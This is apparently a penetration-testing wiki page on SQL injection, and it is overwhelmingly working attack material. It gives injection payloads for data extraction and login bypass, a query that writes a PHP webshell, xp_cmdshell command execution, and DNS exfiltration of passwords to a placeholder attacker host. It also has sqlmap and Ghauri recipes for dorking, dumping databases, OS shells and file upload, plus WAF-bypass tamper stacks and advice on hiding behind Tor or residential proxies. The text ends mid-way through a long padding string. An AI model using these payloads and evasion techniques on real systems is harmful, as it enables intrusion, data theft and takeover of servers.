---
tags:
  - Web
---

# :material-database-arrow-right: SQL Injection

<span class="pill pill-hard">high impact</span> <span class="pill pill-info">web</span>

**SQL injection (SQLi)** happens when user input is concatenated into a SQL query, letting you change the query's *logic*. Impact ranges from auth bypass to full database dump to remote code execution.

!!! abstract "TL;DR"
    Find a parameter that reaches a query, break out of its context, and either read data (UNION / blind) or subvert the app's intent (auth bypass). When manual work gets tedious, hand it to `sqlmap`.

## :material-magnify: Detection

Try these in every parameter (URL, POST body, headers, cookies, JSON):

```text
'                 -- classic error trigger
"                 -- double-quote context
`                 -- MySQL backtick
')  ")  '))       -- break out of function/parentheses
1' AND '1'='1     -- true condition
1' AND '1'='2     -- false condition (page should differ)
1 OR 1=1
1; SELECT 1       -- stacked (driver-dependent)
```

A response that **differs** between the true and false payloads (error, content length, timing) is your signal.

### Fingerprint the DBMS

| Test payload | If it works → |
| --- | --- |
| `SELECT @@version` | MySQL / MSSQL |
| `SELECT version()` | PostgreSQL / MySQL |
| `SELECT banner FROM v$version` | Oracle |
| `SELECT sqlite_version()` | SQLite |
| String concat `'a'\|\|'b'` | Oracle / PostgreSQL |
| String concat `'a'+'b'` | MSSQL |
| String concat `CONCAT('a','b')` | MySQL |

## :material-format-list-numbered: Techniques

=== "Error-based"

    Force the DB to leak data inside an error message.

    ```sql
    -- MySQL (extractvalue)
    ' AND extractvalue(1, concat(0x7e, (SELECT @@version))) -- -

    -- MSSQL (convert error)
    ' AND 1=CONVERT(int,(SELECT @@version)) -- -
    ```

=== "UNION-based"

    Append your own `SELECT` to piggyback data out. First find the column count:

    ```sql
    ' ORDER BY 1 -- -      (increment until it errors)
    ' UNION SELECT NULL -- -
    ' UNION SELECT NULL,NULL -- -   (match the column count)
    ```

    Then find a string-compatible column and extract:

    ```sql
    ' UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- -
    ' UNION SELECT NULL, concat(username,0x3a,password), NULL FROM users -- -
    ```

=== "Boolean-blind"

    No output, but the page changes on true/false. Extract char-by-char:

    ```sql
    ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -
    ' AND (SELECT COUNT(*) FROM users) > 5 -- -
    ```

=== "Time-blind"

    No visible difference at all — use a delay as your oracle.

    ```sql
    -- MySQL
    ' AND IF(1=1, SLEEP(5), 0) -- -
    -- PostgreSQL
    '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -
    -- MSSQL
    '; IF (1=1) WAITFOR DELAY '0:0:5' -- -
    ```

## :material-login: Auth bypass

The oldest trick — turn `WHERE user='X' AND pass='Y'` into always-true:

```sql
Username: admin' -- -
Username: admin' OR '1'='1
Username: ' OR 1=1 LIMIT 1 -- -
```

The `-- -` comments out the rest of the query (the trailing space after `--` matters in MySQL).

## :material-tools: sqlmap

The workhorse for automation. Save a request from Burp to `req.txt` and:

``` { .bash .annotate }
sqlmap -r req.txt --batch --level 5 --risk 3 # (1)!
sqlmap -r req.txt -p id --dbs               # enumerate databases
sqlmap -r req.txt -D shop -T users --dump   # dump a table
sqlmap -r req.txt --os-shell                # try for RCE
```

1. `--level` widens *where* it tests (headers, cookies); `--risk` widens *what* payloads it tries. Crank both when a target is stubborn.

!!! opsec "sqlmap is loud"
    High level/risk sends thousands of requests and can corrupt data with stacked queries. On engagements, prefer targeted manual testing first and use `--technique=BU` to limit noise.

### Essential command overview

*From "Mastering SQLMap and Ghauri: A Practical Guide to WAF Bypass Techniques" by [Lostsec](https://medium.com/@lostsec).*

`-hh` prints every option there is; these are the shapes you actually reach for. Start narrow, escalate only when the easy run comes back empty.

=== "Basic target scanning"

    One GET parameter, then list the databases behind it.

    ```bash
    sqlmap -u "vulnerable_url" --dbs --batch
    ```

=== "Request file (best for POST/headers)"

    Save the raw request out of Burp and sqlmap tests the body, the cookies, the headers and any JSON in it — no quoting games.

    ```bash
    sqlmap -r request.txt --level 5 --risk 3 --batch --dbs
    ```

=== "Dorking"

    Pull candidate URLs from a search engine and test them as they arrive.

    ```bash
    sqlmap -g 'site:target.com inurl:\".php?id=1\"'
    ```

=== "Bulk URLs"

    One file, one run, no babysitting each target.

    ```text
    http://testphp.vulnweb.com/search.php?limit=100
    http://testphp.vulnweb.com/search.php?order=order&query=query
    http://testphp.vulnweb.com/search?q=aaa
    http://testphp.vulnweb.com/showimage.php?file=aa
    ```

    ```bash
    sqlmap -m urls.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
    ```

=== "Tor mode"

    Route everything over Tor when IP reputation or rate limits are the obstacle.

    ```bash
    sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --dbs --batch
    ```

=== "Burp mode"

    Proxy the scan through Burp so you can read exactly what the WAF reacted to.

    ```bash
    sqlmap -r request.txt --level 3 --risk 2 --random-agent --time-sec=30  --proxy https://127.0.0.1:8080 --thread=10 --dbs --hostname --curent-user --current-db
    ```

=== "JSON-based SQLi"

    Hex-encoded payloads into a JSON body, and keep going when the API gateway starts returning 403.

    ```bash
    sqlmap -u 'vulnerable_url' --data '{"User":"admin","Pwd":"admin@123"}' --random-agent --ignore-code 403 --dbs --hex
    ```

=== "Forms"

    Crawl the page, find the inputs, test them all.

    ```bash
    sqlmap -u https://target.com/registration --dbs --forms --crawl=2 --batch
    ```

### Flag reference

=== "Database enumeration"

    ```text
    --dbs                                      # Lists all available databases on the target.
    -D database_name --tables                  # Lists all tables inside the specified database.
    -D database_name -T table_name --columns   # Lists all columns inside the specified table.
    -D database_name -T table_name -C col1,col2 --dump  # Dumps only the selected columns from the table.
    ```

=== "Advanced data extraction"

    ```text
    --dump-all     # Dumps all databases, tables, and data in one go.
    --threads=10   # Uses 10 parallel threads to speed up the attack.
    --hex          # Encodes retrieved data in hex to bypass filters and avoid encoding issues.
    --no-cast      # Disables data type casting to prevent DB conversion errors during extraction.
    ```

=== "Auth & session handling"

    ```text
    --cookie="PHPSESSID=..."               # Sends a session cookie to stay authenticated.
    --headers="X-Forwarded-For: 127.0.0.1" # Adds custom HTTP headers (can spoof IP or bypass WAF rules).
    --csrf-token=token                     # Handles CSRF-protected forms by extracting and reusing the token.
    --random-agent                         # Randomizes User-Agent on each request to avoid detection.
    ```

=== "OS & file system"

    ```text
    --os-shell                              # Attempts to open an interactive command shell on the target OS.
    --os-pwn                                # Tries full system takeover using advanced exploitation methods.
    --file-read=/etc/passwd                 # Reads a file from the target server.
    --file-write=shell.php --file-dest=/var/www/html/shell.php  # Uploads a local file to a specific path on the server.
    ```

=== "Out-of-band & DNS exfil"

    ```text
    --dns-domain=attacker.com   # Uses a custom DNS domain for out-of-band data exfiltration and blind SQLi checks.
    --os-shell --technique=O   # Attempts an OS command shell using only Out-of-Band (DNS/HTTP) injection techniques.
    ```

=== "Header abuse"

    ```text
    --headers="X-Original-URL: /vuln.php"  # Sends a custom header, often used to bypass reverse proxy or WAF routing rules.
    --method=PUT                          # Forces the HTTP request method to PUT instead of GET/POST.
    --param-del=";"                      # Sets a custom parameter delimiter when the target separates parameters with ';'.
    ```

=== "Time & rate evasion"

    ```text
    --delay=5     # Waits 3 seconds between each request to stay stealthy.
    --timeout=20  # Sets 20 seconds as the max wait time for a server response.
    --retries=5   # Retries a failed request up to 5 times.
    --threads=1   # Uses a single thread for slow, low-noise scanning.
    ```

## :material-fire: From SQLi to RCE

<div class="grid" markdown>

!!! loot "MySQL — write a webshell"
    ```sql
    ' UNION SELECT "<?php system($_GET['c']);?>", NULL
      INTO OUTFILE '/var/www/html/s.php' -- -
    ```
    Requires `FILE` privilege and a known writable web path.

!!! loot "MSSQL — command execution"
    ```sql
    '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
       EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
       EXEC xp_cmdshell 'whoami'; -- -
    ```
    Then pivot to a reverse shell → [Windows Privesc](../privesc/windows.md).

</div>

## :material-alert-decagram: Edge cases & gotchas

=== "WAF bypass"

    ```sql
    -- Inline comments split keywords
    UN/**/ION SEL/**/ECT      SELECT → SE%0bLECT (whitespace = tab/newline/%0c)
    -- MySQL versioned comment executes only on MySQL
    /*!50000UNION*/ /*!SELECT*/
    -- Case + no spaces (parentheses/commas as separators)
    UnIoN(SeLeCt(1),2)
    -- Encoding layers: URL-encode twice, or use CHAR()/0xHEX for strings
    ' UNION SELECT 0x61646d696e -- -      (no quotes needed)
    -- Scientific notation / concat to dodge signature
    1.e(UNION)  ;  'a'/**/OR/**/1=1
    ```

    Also try **HTTP Parameter Pollution** (`id=1&id=UNION…`) and moving the payload
    to a header/cookie the WAF doesn't inspect.

=== "No quotes / no spaces"

    - **Quotes filtered:** build strings with `CHAR(97,98)`, hex `0x6162`, or
      `CONCAT`; compare numbers instead of strings.
    - **Spaces filtered:** `/**/`, `%09`/`%0a`/`%0c`/`%0d`, or parentheses:
      `SELECT(column)FROM(table)`.
    - **`=` filtered:** use `LIKE`, `IN`, `BETWEEN`, or `REGEXP`.
    - **Comment (`-- -`, `#`) filtered:** balance the query instead —
      `' OR '1'='1` closes the trailing quote for you.

=== "Second-order"

    Your payload is **stored** clean (registration, profile) and only fires when a
    *different* feature later builds a query from it (password reset, admin report).
    Detection: plant `'` in a stored field, then exercise every feature that reads it
    back. `sqlmap --second-order=<url-that-triggers>` automates the re-read.

=== "Out-of-band exfil"

    When there's no visible/timing oracle (or you want speed over blind), exfil via
    DNS/HTTP the DB itself initiates:
    ```sql
    -- MSSQL
    '; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.ATTACKER\x'; -- -
    -- Oracle
    ' AND (SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.ATTACKER'))=1 -- -
    -- MySQL (Windows, secure_file_priv off)
    ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT ...),'.ATTACKER\\x')) -- -
    ```

!!! bug "Why your injection isn't behaving"
    - **Stacked queries (`;`) are driver-dependent.** PHP `mysqli_query`, most
      MySQL PDO, and many ORMs run **one** statement — your `; DROP`/`; EXEC`
      silently no-ops. MSSQL and PostgreSQL usually allow stacking. If stacking
      fails, pivot to UNION/blind in the *first* statement.
    - **Numeric context needs no quote.** `id=1` → `id=1 OR 1=1`; wrapping it in `'`
      breaks it. Check whether your value is quoted in the query first.
    - **`--` needs a trailing space in MySQL** (`-- -` or `--%20`); `#` also comments
      but must be URL-encoded (`%23`) or the browser eats it.
    - **`LIMIT` + `UNION`** conflict — if the original query has `LIMIT`, your
      appended `UNION` may be constrained; close it or use a subquery.
    - **ORM / JSON injection** points still exist: unsafe `.raw()`,
      `ORDER BY` (can't parameterize a column name → injectable), `IN (…)` list
      building, and MongoDB-style `$where`/operator injection (see
      [NoSQL Injection](nosql-injection.md)).
    - **WAF blocks `sqlmap`'s UA/fingerprint** — add `--random-agent`, `--tamper`
      (e.g. `space2comment,between,charencode`), and `--technique` to narrow it.

## :material-timer-sand: Time-based payloads by DBMS

Quick reference when you only have a delay oracle:

| DBMS | Payload |
| --- | --- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `(select'a'+from+pg_sleep(1));--` |
| MySQL | `(select*from(select(sleep(5)))a)` |

## :material-cloud-off-outline: Cloudflare SQLi bypass

When a heavy/time payload trips Cloudflare (403), URL-encode and comment-wrap it to sneak past:

```text
# Blocked (403)
(select(0)from(select(sleep(10)))v)

# Bypass (200) — URL-encoded + inline-comment padding
(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v
```

## :material-wrench-cog: sqlmap tamper recommendations

Per-DBMS tamper stacks that get past most WAFs. Drop the matching `--tamper=` string onto your `sqlmap` run.

=== "PostgreSQL"

    ```text
    --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor
    ```

=== "MSSQL"

    ```text
    --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
    ```

=== "MySQL"

    ```text
    --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
    ```

=== "Oracle"

    ```text
    --tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
    ```

=== "SQLite"

    ```text
    --tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor
    ```

=== "MS Access"

    ```text
    --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
    ```

=== "SAP MaxDB"

    ```text
    --tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
    ```

!!! tip "General-purpose stack"
    When you don't know the backend yet:
    ```text
    --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
    ```
    More: [Awesome sqlmap tampers](https://blog.redteamguides.com/p/awesome-sqlmap-tampers), [highon.coffee sqlmap cheat sheet](https://highon.coffee/blog/sqlmap-cheat-sheet/).

## :material-shield-off: sqlmap WAF bypass & evasion

*From "Mastering SQLMap and Ghauri: A Practical Guide to WAF Bypass Techniques" by [Lostsec](https://medium.com/@lostsec).*

Modern WAFs score request *behaviour*, not just keywords, so the job is to change the shape of the payload on the way out. Tamper scripts do that rewriting; the per-vendor stacks below are the ones that keep working.

### Per-vendor recipes

=== "Ignore blocked status codes"

    A WAF answering 403 or 500 will otherwise stop the scan dead. Tell sqlmap to keep going.

    ```bash
    sqlmap -r request.txt --level=5 --risk=3 --no-cast --force-ssl --ignore-code=500 --dbs
    ```

=== "Imperva / Incapsula"

    ```bash
    sqlmap -u 'vulnerable_url' --risk 3 --level 5 --dbs --tamper=space2comment,space2morehash
    ```

=== "ModSecurity"

    Break the regex with comments and versioned keywords, then slow the whole thing down.

    ```bash
    proxychains sqlmap -u 'vulnerable_url' --random-agent --batch --dbs --level 3 --tamper=between,space2comment --hex --delay 5
    ```

    ```bash
    sqlmap -u 'vulnerable_url' --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --batch --level 3
    ```

=== "Cloudflare"

    Random case plus encoding plus inline comments — enough to break the signature without mangling the query.

    ```bash
    sqlmap -u 'vulnerable_url' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms=MySQL
    ```

    ```bash
    sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
    ```

    ```bash
    sqlmap -u "vulnerable_url" --tamper=space2comment,randomcase,charencode --level 5 --risk 3 --batch --dbs
    ```

    ```bash
    proxychains sqlmap -u 'vulnerable_url' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10
    ```

!!! bug "Three tampers, maximum"
    Stacking tamper scripts makes payloads enormous, which trips the WAF you were trying to dodge, causes scripts to conflict, and produces false positives on a slower scan. Use the fewest that work.

### Tamper stacks by WAF

```text
--tamper=between,randomcase,space2comment                 # Effective on: ModSecurity, Cloudflare, F5 ASM
--tamper=space2comment,space2morehash                     # Effective on: ModSecurity, Imperva SecureSphere
--tamper=modsecurityversioned,space2comment               # Effective on: ModSecurity, Comodo WAF
--tamper=space2comment,between,randomcase,charencode      # Effective on: Cloudflare, Akamai, Sucuri
--tamper=space2comment,randomcase,unmagicquotes           # Effective on: PHP WAFs, Wordfence, LiteSpeed
--tamper=space2comment,between,percentage                 # Effective on: Imperva, Barracuda
--tamper=charencode,randomcase,space2comment              # Effective on: Cloudflare, F5 ASM, Radware
--tamper=space2plus,space2comment,randomcase              # Effective on: Akamai, Sucuri, StackPath
--tamper=between,space2comment,modsecurityzeroversioned   # Effective on: ModSecurity, Comodo
--tamper=space2comment,randomcase,apostrophemask          # Effective on: Imperva, Cloudflare
--tamper=charunicodeencode,space2comment,randomcase       # Effective on: Akamai, Radware, Azure WAF
--tamper=space2comment,between,randomcase,bluecoat        # Effective on: BlueCoat / Symantec WAF
--tamper=space2comment,between,randomcase,equaltolike     # Effective on: F5 ASM, Citrix NetScaler
--tamper=space2comment,randomcase,overlongutf8            # Effective on: FortiWeb, Legacy ModSecurity rules
```

Full per-script details (requirements, tested environments, example injections) live in the [tamper script cheatsheet](https://github.com/coffinxp/payloads) and the [official sqlmap tamper directory](https://github.com/sqlmapproject/sqlmap/tree/master/tamper).

### :material-format-list-bulleted-type: What each tamper actually does

The stacks above tell you *what to chain*; this is *what each script does*. List
what your build ships with:

```bash
sqlmap --list-tampers
```

Every script is applied the same way — swap the name:

```bash
sqlmap -u "https://$TARGET/vuln?id=1" --tamper=space2comment
```

!!! bug "\"Beats WAF X\" is folklore — sqlmap does not claim it"
    sqlmap's own docstrings document a **DBMS** requirement and the DBMS versions
    a script was tested against. They say nothing about WAF vendors — only
    `modsecurityversioned`, `space2hash` and `halfversionedmorekeywords` mention a
    WAF at all. The *Claimed vs* column below is community lore, not upstream
    fact: it shifts with every ruleset update, so treat it as a starting order to
    try, never as a guarantee. The **Requires** column is the one that will
    actually break your run if you ignore it.

| Script | What it does | Example | Requires | Claimed vs |
| --- | --- | --- | --- | --- |
| `space2comment` | spaces → `/**/` | `SELECT id FROM users` → `SELECT/**/id/**/FROM/**/users` | — | Forti, Barracuda, CF, Akamai |
| `space2hash` | spaces → `#` + random string + newline | `1 AND 9227=9227` → `1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227` | MySQL | Akamai, Barracuda |
| `space2dash` | spaces → `--` + random string + newline | `1 AND 9227=9227` → `1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227` | MSSQL | Forti, CF, Barracuda |
| `multiplespaces` | pads keywords with multiple spaces | `1 UNION SELECT foobar` → `1     UNION     SELECT     foobar` | — | F5, Barracuda |
| `randomcase` | randomises keyword case | `INSERT` → `InSeRt` (leaves `f()` alone) | — | Akamai, CF |
| `lowercase` | lowercases keyword characters | `INSERT` → `insert` | — | F5, Imperva |
| `randomcomments` | inline comments **inside** keywords | `INSERT` → `I/**/NS/**/ERT` | — | Barracuda, Akamai |
| `charencode` | URL-encodes every char (skips already-encoded) | `SELECT FIELD FROM%20TABLE` → `%53%45%4C%45%43%54%20…` | — | Forti, Imperva, Akamai |
| `chardoubleencode` | double URL-encodes every char | `SELECT …` → `%2553%2545%254C%2545%2543%2554…` | — | Akamai, F5 |
| `overlongutf8` | non-alphanum → overlong UTF-8 | `… WHERE 2>1` → `…WHERE%C0%A02%C0%BE1` | — | Forti, CF |
| `base64encode` | Base64-encodes the **whole payload** | `1' AND SLEEP(5)#` → `MScgQU5EIFNMRUVQKDUpIw==` | — | Forti, Imperva |
| `appendnullbyte` | appends `%00` | `1 AND 1=1` → `1 AND 1=1%00` | MS Access | Barracuda, CF |
| `equaltolike` | `=` → `LIKE` | `… WHERE id=1` → `… WHERE id LIKE 1` | MySQL | Akamai, CF, Forti |
| `between` | `>` → `NOT BETWEEN 0 AND`, `=` → `BETWEEN x AND x` | `1 AND A > B--` → `1 AND A NOT BETWEEN 0 AND B--` | — | Imperva, F5, Barracuda |
| `commalesslimit` | `LIMIT M, N` → `LIMIT N OFFSET M` | `LIMIT 2, 3` → `LIMIT 3 OFFSET 2` | MySQL | Imperva, Akamai |
| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | `-1 UNION ALL SELECT` → `-1 UNION SELECT` | — | F5, Imperva |
| `modsecurityversioned` | wraps the **whole query** in a versioned comment | `1 AND 2>1--` → `1 /*!30963AND 2>1*/--` | MySQL | CF, Barracuda |
| `versionedkeywords` | wraps each non-function keyword in `/*!…*/` | `1 UNION ALL SELECT NULL` → `1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/` | MySQL | CF, Imperva |
| `halfversionedmorekeywords` | prefixes each keyword with `/*!0` | `1' UNION ALL SELECT` → `1'/*!0UNION/*!0ALL/*!0SELECT` | MySQL &lt; 5.1 | F5, CF |

!!! danger "Two names in circulation don't exist"
    - **`nonrecursivereplacement`** was **removed from sqlmap in October 2018**
      ("can't work out of the box"). It still appears in the copy-paste
      per-DBMS stacks above and all over the internet — sqlmap will abort with an
      unknown-tamper error if you leave it in.
    - **`space2tab`** has never existed. The real space-substituting scripts are
      `space2comment`, `space2morecomment`, `space2hash`, `space2morehash`,
      `space2dash`, `space2plus`, `space2randomblank`, `space2mssqlblank`,
      `space2mssqlhash`, `space2mysqlblank`, `space2mysqldash`.

    Verify against `--list-tampers` before trusting any stack you copied.

### :material-file-code: Writing your own tamper

A tamper is a Python file in sqlmap's `tamper/` directory exposing a
`tamper(payload, **kwargs)` function. `__priority__` decides ordering when you
chain several. This one breaks up keywords so naive pattern matching misses them:

```python title="tamper/commentbypass.py"
#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Splits SQL keywords with inline comments to defeat keyword matching

    >>> tamper('SELECT * FROM users WHERE id=1')
    'SE/*bypass*/LECT * FR/*bypass*/OM users WHERE id=1'
    """

    if payload:
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'ORDER', 'GROUP',
                    'INSERT', 'UPDATE', 'DELETE']

        for keyword in keywords:
            payload = payload.replace(keyword, f"{keyword[:2]}/*bypass*/{keyword[2:]}")

    return payload
```

```bash
sqlmap -u "https://$TARGET/vuln?id=1" --tamper=commentbypass
```

!!! tip "Match the signature or it won't load"
    Current sqlmap calls `tamper(payload, **kwargs)` — every one of the 85 shipped
    scripts uses that signature. A bare `def tamper(payload):` copied from an older
    tutorial will fail at load time. Add a `>>> tamper(...)` doctest like the
    stock scripts do and you can regression-test it yourself.

### Evasion habits that pay off

- `--ignore-code=401,403` (or whatever the block code is) so the WAF can't end your scan for you.
- `proxychains` with **residential** proxies. Datacenter IPs lose to reputation scoring; residential ones mostly don't.
- `--dbms mysql` (or `postgresql`, `mssql`, …) once you've fingerprinted the backend — engine-specific payloads are fewer, quieter and land faster.
- `--risk 2` with a moderate `--level` when the default payloads fail. Save `--risk 3` for when you truly need it; it's aggressive enough to destabilise a target.
- `--hex` when filtering or encoding is mangling extracted data.
- `--null-connection` to test with minimal response data (less for the WAF to inspect), and `--keep-alive` to reuse the TCP connection so traffic looks browser-shaped.
- `--no-cast` when type casting is what's breaking your payloads.

!!! tip "AI wrapper"
    [sqlmap-ai](https://github.com/atiilla/sqlmap-ai) drives sqlmap with model-assisted decisions on technique and tamper selection across the major engines.

## :material-ghost: Ghauri

*From "Mastering SQLMap and Ghauri: A Practical Guide to WAF Bypass Techniques" by [Lostsec](https://medium.com/@lostsec).*

[Ghauri](https://github.com/r0oth3x49/ghauri) is the other half of the toolkit: an exploitation framework tuned for blind, time-based and WAF-fronted targets — JS-heavy apps, REST APIs, cloud WAFs where fixed payload patterns get eaten. It obfuscates payloads by default and calibrates its own delays, so its traffic reads as human. Syntax is close enough to sqlmap that switching costs nothing.

**Always run both.** sqlmap finds injections Ghauri misses and vice versa; picking one tool means leaving findings on the table.

=== "Basic scan"

    ```bash
    ghauri -u "vulnerable_url" --dbs --batch
    ```

=== "Request file"

    ```bash
    ghauri -r request.txt -p txt_user_id --dbs --batch --level 3 
    ```

=== "Bulk URLs"

    ```bash
    ghauri -m urls.txt --batch --dbs --level 3 --threads 10
    ```

=== "JSON & API targeting"

    Feeding the JSON body via `--data` tends to beat a saved Burp request file here.

    ```bash
    ghauri -u 'vulnerable_url' --data '{"User":"test","Pwd":"test@123"}' --random-agent --dbs --level 3 --batch
    ```

### Ghauri WAF bypass

```text
--prefix "')/**/"   # Adds a custom string before each payload to help break out of the original query context.
--suffix "--+"     # Appends a SQL comment to terminate the rest of the original query safely.
--skip-urlencode  #Skip URL encoding of payload data
--confirm        # Verifies and confirms the injected payloads before proceeding with exploitation
proxychains     # Routes all traffic through a proxy to hide your real IP and evade IP-based blocking or rate limits.
```

```bash
ghauri -u 'vulnerable_url' --batch --dbs --level 3 --dbms mysql --confirm --time-sec 10 --delay 5
```

```bash
ghauri -u 'vulnerable_url' --dbs --batch --level 3 --dbms mysql --tech=T --level 3 --confirm --time-sec 10 --delay 5
```

```bash
proxychains ghauri -u "vulnerable_url" -p param --batch --dbs --confirm --level 3 --time-sec 10
```

```bash
ghauri -u 'vulnerable_url' --dbs --level 3 --batch --dbms=mysql --random-agent --confirm
```

Habits worth keeping:

- `--confirm` re-validates every payload and kills most false positives.
- `--delay` to stay under rate limits and behaviour-based blocking.
- `proxychains` with residential IPs, same reasoning as sqlmap.
- `--level 3` to widen the injection tests.
- If `--dbs` returns nothing, try `--current-user`, `--current-db` and `--hostname` to confirm the injection is real before giving up on it.
- `--ignore-code` to skip past blocking responses (401, 403).
- `--dbms` once the backend is known — faster and more precise.

### Fortinet bypass with junk data

Pad the request with a kilobyte of garbage so the WAF's parser and the backend's parser disagree about what they're looking at; the injection rides along in the part the WAF stopped reading.

```bash
ghauri --data "junk=asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd